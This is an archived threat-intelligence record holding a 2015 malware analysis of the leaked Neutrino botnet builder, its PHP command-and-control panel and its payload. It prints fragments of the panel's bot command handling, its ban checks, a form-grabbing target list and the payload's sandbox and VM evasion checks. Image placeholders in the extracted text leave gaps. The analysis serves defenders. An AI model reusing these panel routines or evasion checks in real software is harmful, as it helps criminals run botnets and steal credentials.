{
    "id": "c44abcf8-0f13-420b-aeb7-6001d8dd3833",
    "created_at": "2023-01-12T15:02:36.823407Z",
    "updated_at": "2025-03-27T02:06:11.785836Z",
    "deleted_at": null,
    "sha1_hash": "8f752a9c453ec5ec4adac7e89cc9da5f6fb2b74b",
    "title": "2015-08-19 - Inside Neutrino botnet builder",
    "authors": "",
    "file_creation_date": "2022-05-28T02:30:12Z",
    "file_modification_date": "2022-05-28T02:30:12Z",
    "file_size": 884318,
    "plain_text": "# Inside Neutrino botnet builder\n\n**[blog.malwarebytes.com/threat-analysis/2015/08/inside-neutrino-botnet-builder/](https://blog.malwarebytes.com/threat-analysis/2015/08/inside-neutrino-botnet-builder/)**\n\nhasherezade August 19, 2015\n\nIt is common practice among cybercriminals to sell their products in the form of packages,\nconsisting of:\n\n**a malicious payload – a frontend of the malware that is used for infecting users**\n**a C&C panel – a backend of the malware, usually designed as a web-application, often**\ndedicated to LAMP environment\n**a builder – an application used for packing the payload and embedding in it**\ninformation specific for the interest of the particular distributor (the C&C address, some\nconfiguration, etc)\n\nSuch packages are commercial products sold on the black market. However, from time to\ntime it happens that the product leaks into mainstream media. It gives researchers a\nprecious opportunity to take a closer look on the used techniques.\n\n[Recently, I found a leaked package containing the builder for the Neutrino botnet. It is not](https://www.malwarebytes.com/botnet)\nthe newest version (as usually the case), but it still provides lot of useful information that can\nhelp in comparative analysis with the samples that are nowadays actively distributed.\n\n## Elements involved\n\n\n-----\n\n– Neutrino Builder – 32 bit PE, written in VS2013, packed with Safengine Shielden\n**[v2.3.6.0 (md5=80660973563d13dfa57748bacc4f7758)](https://www.virustotal.com/en/file/e05b7d761bd3ed4b0c46572815949768ca7a8a46d145448db82237b6e88d17bb/analysis/)**\n– panel (written in PHP)\n– stub (payload) – 32 bit PE, written in MS Visual C++\n[(md5=55612860c7bf1425c939815a9867b560, section .text](https://www.virustotal.com/en/file/062c0eb2778d85986248b422cf4f48ad219e4422262163099e053483e0a3ccd4/analysis/)\nmd5=07d78519904f1e2806dda92b7c046d71)\n\n## Functionality\n\n### Neutrino Builder v3.9.4\n\nThe builder has been written in Visual Studio 2013, and it requires the appropriate\nredistributable package to run. The provided version is cracked (as the banner states:\n“Cracked and coded by 0x22”).\n\nThe functionality of this tool is very simple – it just asks a user for the C&C address and\nwrites it inside the payload:\n\nComparing 2 payloads – the original one, and the one edited by the Builder, we can see that\nchanges made by the builder are really small – it simply encrypts the supplied URL and\nstores it in the dedicated section.\n\nBelow: left (stub) – original payload, right (test_stub.exe) – edited payload.\n\n\n-----\n\n### Panel\n\n\n-----\n\nThe package contains full instructions written in Russian (readme.txt), where we can find\nmany interesting details about the functionality (examples below).\n\n\n-----\n\nThe requirements for the panel installation:\n\nPHP\nMySQL not lower than 5.6 (for the full functionality)\n\nDefault login and password to the panel: admin, admin\n\nTasks performed by the infected client on demand:\n\nvarious types of DDoS attacks\nkeylogging (enable/disable), including – trace text in a defined window\nfind file of the defined type\nupdate bot\nremove bot\nDNS spoofing (redirect address X to address Y)\nFormgrabbing, stealing FTP credentials\ndownload and execute a file one of the following types (EXE, DLL, bat, vbs)\nadd defined entry into the Windows Registry\n\nFull list of commands sent to bot:\n\n\n-----\n\n```\n             ($ )\n{\n  switch (strtolower($command)) {\n    case \"ddos\":\n      return \"http\";\n      break;\n    case \"https ddos\":\n      return \"https\";\n      break;\n    case \"slowloris ddos\":\n      return \"slow\";\n      break;\n    case \"smart http ddos\":\n      return \"smart\";\n      break;\n    case \"download flood\":\n      return \"dwflood\";\n      break;\n    case \"udp ddos\":\n      return \"udp\";\n      break;\n    case \"tcp ddos\":\n      return \"tcp\";\n      break;\n    case \"find file\":\n      return \"findfile\";\n      break;\n    case \"cmd shell\":\n      return \"cmd\";\n      break;\n    case \"keylogger\":\n      return \"keylogger\";\n      break;\n    case \"spreading\":\n      return \"spread\";\n      break;\n    case \"update\":\n      return \"update\";\n      break;\n    case \"loader\":\n      return \"loader\";\n      break;\n    case \"visit url\":\n      return \"visit\";\n      break;\n    case \"bot killer\":\n      return \"botkiller\";\n      break;\n    case \"infection\":\n      return \"infect\";\n      break;\n    case \"dns spoofing\":\n      return \"dns\";\n      break;\n  }\n  return \"failed\";\n}\nC&C is very sensitive for illegitimate requests and reacts by blacklisting the IP of\nthe source:\n\n```\n\n-----\n\n```\n{\n $bot_user_agent = \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0\";\n if ($_SERVER['HTTP_USER_AGENT'] != $bot_user_agent) {\n  AddBan($ip);\n }\n if (!isset($_COOKIE['authkeys'])) {\n  AddBan($ip);\n }\n $cookie_check = $_COOKIE['authkeys'];\n if ($cookie_check != \"21232f297a57a5a743894a0e4a801fc3\") { /* md5(admin) */\n  AddBan($ip);\n }\n}\nLooking at install.php we can also see what are the formgrabbing targets. The list includes the most\npopular e-mails and social networking sites (facebook, linkedin, twitter and others).\n\n```\n\n-----\n\n```\n\"('capture_all',\n'.microsoft.com\\r\\ntiles.services.mozilla.com\\r\\nservices.mozilla.com\\r\\n.mcafee.com\\r\\nvs.mcafeeasap.com\\r\\nscan.pchealthadvisor.com\\r\\navg.com\\r\\nrrs.symantec.com\\r\\n\n     \\r\\n.msg.yahoo.com\\r\\ngames.yahoo.com\\r\\n.toolbar.yahoo.com\\r\\nquery.yahoo.com\\r\\nyahoo.com/pjsal\\r\\neBayISAPI.dll?\nVISuperSize&amp;amp;amp;amp;item=\\r\\nbeap.bc.yahoo.com\\r\\n.mail.yahoo.com/ws/mail/v1/formrpc?\nappid=YahooMailClassic\\r\\n.mail.yahoo.com/dc/troubleLoading\\r\\n.mail.yahoo.com/mc/compose\\r\\nmail.yahoo.com/mc/showFolder\\r\\nmail.yahoo.com/mc/showMessage\\r\\ninstallers\nanalytics.com/collect\\r\\nmaps.google\\r\\nnews.google\\r\\ngoogleapis.com\\r\\noogle.com/u/0/\\r\\noogle.com/u/1/\\r\\noogle.com/u/2/\\r\\noogle.com/u/3/\\r\\noogle.com/u/4/\\r\\noogle\nchannel/channel/\\r\\noogle.com/cloudsearch/\\r\\noogle.com/document/\\r\\noogle.com/dr\\r\\noogle.com/act\\r\\noogle.com/pref\\r\\noogle.com/cp\\r\\noogle.com/drive/\\r\\noogle.com/o/\nui\\r\\noogle.com/calendar\\r\\nogle.com/logos/\\r\\noglevideo.com\\r\\noglesyndication.com/activeview\\r\\nreddit.com/api/\\r\\ngeo.opera.com\\r\\n.com/do/mail/message/\\r\\nhttpcs.ms\nfriends/\\r\\nfacebook.com/growth/\\r\\nfacebook.com/intl/\\r\\nfacebook.com/logout\\r\\nfacebook.com/mobile/\\r\\nfacebook.com/photos/\\r\\nfacebook.com/video/\\r\\nfacebook.com/plu\ntrk\\r\\nlinkedin.com/wvmx/\\r\\nmyspace.com/beacon/\\r\\nmyspace.com/ajax/\\r\\nok.ru/app\\r\\nok.ru/gwtlog\\r\\nok.ru/?\ncmd\\r\\nok.ru/dk\\r\\nok.ru/feed\\r\\nok.ru/game\\r\\nok.ru/profile\\r\\nok.ru/push\\r\\nplayer.vimeo.com\\r\\nsgsapps.com\\r\\nmyfarmvillage.com\\r\\napi.connect.facebook.com\\r\\nupload\nwa=wsignin1.0\\r\\nusers.storage.live.com/users/\\r\\naccount.live.com/API/\\r\\nmail.live.com/mail/mail.fpp\\r\\nmail.live.com/mail/options\\r\\nmail.live.com/ol/\\r\\nmail.live.c\nabn-finder/\\r\\namazon.com/gp/registry/wishlist/')\";\n$ff_hostname = \"INSERT INTO `formgrabber_host` (`hostnames`) VALUES ('live,mail,paypal')\";\nThe main file used for communication with the bot is tasks.php. Only POST requests are accepted.\nBelow: adding information sent by a bot into the database:\n\n```\n\n-----\n\n```\n AddBan($real_ip);\n}\nCheckBotUserAgent($real_ip);\nCheckBan($real_ip);\nif (isset($_POST['cmd'])) {\n $time = time();\n $date = date('Y-m-d H:i:s');\n $bot_ip = $real_ip;\n $bot_os = $_POST['os'];\n $bot_name = urlencode($_POST['uid']);\n $bot_uid = md5($bot_os . $bot_name);\n $bot_time = $time;\n $bot_date = $date;\n $bot_av = strip_data($_POST['av']);\n $bot_version = strip_data($_POST['version']);\n $bot_quality = intval($_POST['quality']);\n $gi = geoip_open(\"GeoIP/GeoIP.dat\";, GEOIP_STANDARD);\n $bot_country = geoip_country_code_by_addr($gi, $bot_ip);\n if ($bot_country == null) {\n $bot_country = \"O1\";\n}\ngeoip_close($gi);\nOpening index.php causes adding client’s IP into a blacklist (unconditional):\n\n```\n\n-----\n\n```\nAddBan($real_ip);\nStub\nAll the commands that can be found in the backend are reflected in the frontend. We can see it clearly, because the payload is not obfuscated!\nHard-coded authkey, that is checked in by the C&C occurs in every request sent by the bot:\nBot is registering itself to C&C, reporting its version and environment:\nImplementation of the commands requested by the C&C (selected\nexamples):\nDownloading specified payload form the C&C:\n\n```\n\n-----\n\n```\nKeylogger (fragment)\nFramegrabber (fragment)\n\n```\n\n-----\n\n```\nSteal Clipboard content (fragment):\nThe stolen content (i.e. logged keys) is saved in a file(logs.rar). Further, the file is read and uploaded to the C&C:\n\n```\n\n-----\n\n```\nWrapping the file in a POST request:\nAlso, success and failure of every task requested by the C&C is reported by the bot:\n\n```\n\n-----\n\n```\nThis malware is a threat not only for a local computer. It also scans LAN searching for shared resources and steals them:\nSteal shared (fragment):\n\n```\n\n-----\n\n```\nDefensive techniques\nThe payload also contains an extensive set of various defensive functions.\nIn addition to the well-known checks – like isDebuggerPresent, we can find some that are less spread – like checking the user name against names used by known sandboxes: “maltest”, “tequilaboomboom”,”sandbox”,\n“virus”, “malware”. Full set explained below:\n\n```\n**is debugger present, via:**\n\n_IsDebuggerPresent_\n**is remote debugger present, via:**\n\n_CheckRemoteDebuggerPresent(GetCurrentProcess(), pDebuggerPresent)_\n**check if running under Wine, via:**\n\n_GetProcAddress(GetModuleHandleW(“kernel32.dll”), “wine_get_unix_file_name”)_\n\nCheck presence of blacklisted substrings (ignore case):\n\n**username via:**\n\n_GetUserNameW vs {“MALTEST“, “TEQUILABOOMBOOM“, “SANDBOX“,_\n“VIRUS“,”MALWARE“}\n**current module name, via:**\n\n_GetModuleNameW vs {“SAMPLE“, “VIRUS“, “SANDBOX” }_\n**BIOS version, via registry key:**\n\n“HARDWARE\\Description\\System“, value “SystemBiosVersion” against: {“VBOX“,\n“QEMU“, “BOCHS“}\n**BIOS version, via registry key:**\n\n“HARDWARE\\Description\\System“, value “VideoBiosVersion” against:\n“VIRTUALBOX“\n\n\n-----\n\n**SCSI : via registry key:**\n“HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id“, value “Identifier“),\nagainst {“VMWARE“, “VBOX“, “QEMU“}\n\nCheck presence of:\n\n**VMWareTools, via registry key: SOFTWARE\\VMware, Inc.\\VMware Tools**\n**VBoxGuestAdditions, via registry key: SOFTWARE\\Oracle\\VirtualBox Guest**\n_Additions_\n\n## Conclusion\n\nMalware analysts usually deal with just one piece of the puzzle from the following set – the\nmalicious payload. Having a look at full packages, like the one described above, helps to see\nthe bigger picture.\n\nIt also gives a good overview on how the actions of distributing malware are coordinated. As\nwe can see, criminals are provided with a very easy way to bootstrap their own malicious\nC&C. It doesn’t really require advanced technical skills to become a botnet owner. We live in\nage when malware is a weapon available to the masses – that’s why it is so crucial for\neveryone to have a solid and layered protection.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-08-19 - Inside Neutrino botnet builder.pdf"
    ],
    "report_names": [
        "2015-08-19 - Inside Neutrino botnet builder.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535756,
    "ts_updated_at": 1743041171,
    "ts_creation_date": 1653705012,
    "ts_modification_date": 1653705012,
    "files": {
        "pdf": "https://archive.orkl.eu/8f752a9c453ec5ec4adac7e89cc9da5f6fb2b74b.pdf",
        "text": "https://archive.orkl.eu/8f752a9c453ec5ec4adac7e89cc9da5f6fb2b74b.txt",
        "img": "https://archive.orkl.eu/8f752a9c453ec5ec4adac7e89cc9da5f6fb2b74b.jpg"
    }
}